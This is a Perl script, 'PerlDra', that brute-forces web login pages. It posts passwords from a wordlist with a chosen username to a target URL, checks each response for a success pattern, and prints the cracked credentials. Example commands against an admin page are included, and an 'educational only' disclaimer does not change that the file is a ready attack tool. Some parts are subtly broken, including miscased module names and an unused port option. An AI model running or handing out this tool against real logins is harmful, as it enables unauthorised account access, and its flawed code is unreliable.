#!/bin/perl
# perl version : 5.30
# Description : This program burte force login page
package PerlDra;

use warnings;
use strict;
use safe;
use Getopt::Long;
use Time::Hires;
use Time::Seconds;
use Term::ANSIColor;
use utf8;
use threads;

use LWP::UserAgent;

Getopt::Long::Configure('bundling');

my $helpText = "
Description : This program test the login page of web site with curl request

Usage : \n
--target   | -t\t: url target to attack
--port     |   \t: port to attack
--wordlist | -w\t: wordlist
--username | -u\t: username to test
--data     | -d\t: data to send in request (|USER| => for users, |PASS| => for passwords)
--cookie   |   \t: cookie to use
--timeout  |   \t: request timeout (default 10 sec)
--pattern  |   \t: pattern to find for success
--no-match |   \t: for inverse search is sucess when the pattern missing
--help     | -h\t: print this help
--verbose  | -v\t: print more verbose

(This tool is for educational purpose only)

\nExample :

perl PerlDra.pl -t http://192.168.1.1/admin.php -u admin -w rockyou.txt --pattern \"Login successful\" --data \"username=|USER|&password=|PASS|&submit=Login\"

perl PerlDra.pl -t http://192.168.1.1/admin.php --port 8080 -u admin -w rockyou.txt --pattern \"Wrong password\" --no-match --cookie \"PHPESSID=el4ukv0kqbvoirg7nkp4dncpk3\" --data \"username=|USER|&password=|PASS|&submit=Login\"
";

my $versionText = "
Author \t: \@Exo-poulpe
Version \t: 0.1.0.1

This tool is for educational purpose only, usage of PerlForing for attacking targets without prior mutual consent is illegal.
Developers assume no liability and are not responsible for any misuse or damage cause by this program.

";

my $help;
my $version;
my $verbose;
my $timeout = 10;
my $target;
my $port = 80;
my $wordlist;
my $counter;
my $username = "admin";
my $cookie;
my $data;
my $pattern;
my $match = 0;
my $time;
my $head;
my $result;
my $totCount = 1;

GetOptions(
    'target|t=s'   => \$target,      # string
    'port=i'       => \$port,        # int
    'timeout=i'    => \$timeout,     # int
    'data|d=s'     => \$data,        # string
    'cookie=s'     => \$cookie,      # string
    'username|u=s' => \$username,    # string
    'wordlist|w=s' => \$wordlist,    # string
    'pattern=s'    => \$pattern,     # string
    'no-match'     => \$match,       # flag
    'time'         => \$time,        # flag
    'count'        => \$counter,     # flag
    'verbose|v'    => \$verbose,     # flag
    'help|h|?'     => \$help,        # flag
) or die($helpText);

sub main()
{
    if ( defined $help )
    {
        print($helpText);
    }
    elsif ( defined $target && defined $username && defined $wordlist )
    {
        if ( defined $cookie )
        {
            $head = {
                'Content-Type' => 'text/plain',
                'User-Agent'   => 'Firefox',
                'Accept'       => '*/*',
                'Cookie'       => $cookie
            };
        }
        else
        {
            $head = {
                'Content-Type' => 'text/plain',
                'User-Agent'   => 'Firefox',
                'Accept'       => '*/*'
            };
        }

        open( DATA, "< " . $wordlist )
          or die( "Error cannot open file ", $wordlist, " \n$!\n" );
        while (<DATA>)
        {
            chomp($_);
            my $password = $_;
            my $start    = Time::HiRes::gettimeofday();
            my $request  = HTTP::Request->new( POST => $target );
            $request->content_type('application/x-www-form-urlencoded');
            $request->header($head);
            my $content = ConvertData( $data, $username, $password );
            $request->content($content);

            if ( defined $verbose )
            {
                print("\nRequest : \n");
                print( '=' x 50 );
                print("\n");
                print( $request->as_string() );
                print( '=' x 50 );
                print("\n");
            }

            my $useragent = LWP::UserAgent->new();

            my $response = $useragent->request($request);
            if ( $response->is_success )
            {
                $result = $response->decoded_content;
                my $stop    = Time::HiRes::gettimeofday();
                my $elapsed = $stop - $start;

                # $elapsed = $elapsed->pretty;
                if ( defined $verbose )
                {
                    print("\nResponse : \n");
                    print( '=' x 50 );
                    print( "\n", $result, "\n" );
                    print( '=' x 50 );
                    print("\n");

                }
                else
                {
                    print("Request send\n");
                }
                print("\n");
                print("\n");
                if ( defined $time )
                {
                    print("Time response : $elapsed Seconds\n\n");
                }
            }
            else
            {
                print("Request fail\n");
            }
            if ( defined $counter )
            {
                print("Test number : $totCount\n");
            }

            my $resutPattern = MatchPattern( $response->decoded_content,
                $pattern, $match, $verbose );
            if ( $resutPattern == 1 )
            {
                PrintCreds( $username, $password );
                last;
            }
            else
            {
                if ( defined $verbose )
                {
                    PrintFail();
                }
            }
            $totCount += 1;
        }

    }
    else
    {
        print($helpText);
    }
}

sub MatchPattern($$$$)
{
    my ( $res, $patt, $mat, $ver ) = @_;

    if ( defined $verbose )
    {
        if ( $mat == 1 )
        {
            print("No matching enable with pattern : '$patt'\n");
        }
        else
        {
            print("Pattern : '$patt'\n");
        }
        print("\n");
    }

    my $pos = index( $res, $patt );

    if ( $mat == 1 )
    {
        if ( $pos >= 0 )
        {
            $pos = -1;
        }
        else
        {
            $pos = 0;
        }
    }

    if ( $pos < 0 )
    {
        return 0;
    }
    else
    {
        return 1;
    }
}

sub ConvertData($$$)
{
    my ( $body, $user, $pass ) = @_;
    my $pos;
    my $final;
    if ( ( $pos = index( $body, '|USER|' ) ) >= 0 )
    {
        $final = ReplaceStr( $body,  '|USER|', $user );
        $final = ReplaceStr( $final, '|PASS|', $pass );
        return $final;
    }

}

sub ReplaceStr($$)
{
    my ( $baseStr, $replaceStr, $newStr ) = @_;
    my $lenReplace = length($replaceStr);
    my $pos        = index( $baseStr, $replaceStr );
    my $result;
    if ( $pos >= 0 )
    {
        my $tmp  = substr( $baseStr, 0, $pos );
        my $tmp2 = substr( $baseStr, $pos + $lenReplace );
        $tmp .= $newStr;
        $tmp .= $tmp2;
        $result = $tmp;
    }
    return $result;

}

sub PrintCreds($$)
{
    my ( $user, $pass ) = @_;
    print( "[", color('blue'), "*", color('reset'), "]Brute finish\n" );
    print( "username : ", color('green'), $user, color('reset'), " \n" );
    print( "password : ", color('green'), $pass, color('reset'), "\n" );
}

sub PrintFail()
{
    print("\n");
    print( color('red') );
    print("username and password not found\n");
    print( color('reset') );
    print("\n");
}

main();
